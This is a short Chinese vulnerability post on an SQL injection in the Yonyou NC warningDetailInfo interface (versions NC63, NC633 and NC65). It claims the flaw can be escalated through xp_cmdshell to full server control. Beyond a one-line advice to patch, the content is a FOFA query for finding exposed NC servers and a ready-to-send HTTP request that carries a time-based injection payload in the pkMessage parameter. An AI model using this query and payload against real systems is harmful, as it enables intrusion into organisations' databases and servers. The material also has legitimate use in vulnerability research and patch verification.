## 用友NC-warningDetailInfo接口存在SQL注入漏洞

用友NC /ebvp/[infopub](https://cn-sec.com/archives/tag/infopub)/warningDetailInfo接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。

影响范围：NC63、NC633、NC65

## fofa

```
app="用友-UFIDA-NC"
```

## poc

```
GET /ebvp/infopub/warningDetailInfo?pageId=login&pkMessage=1'waitfor+delay+'0:0:5'-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

![用友NC warningDetailInfo接口存在SQL注入漏洞](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405251322607.png)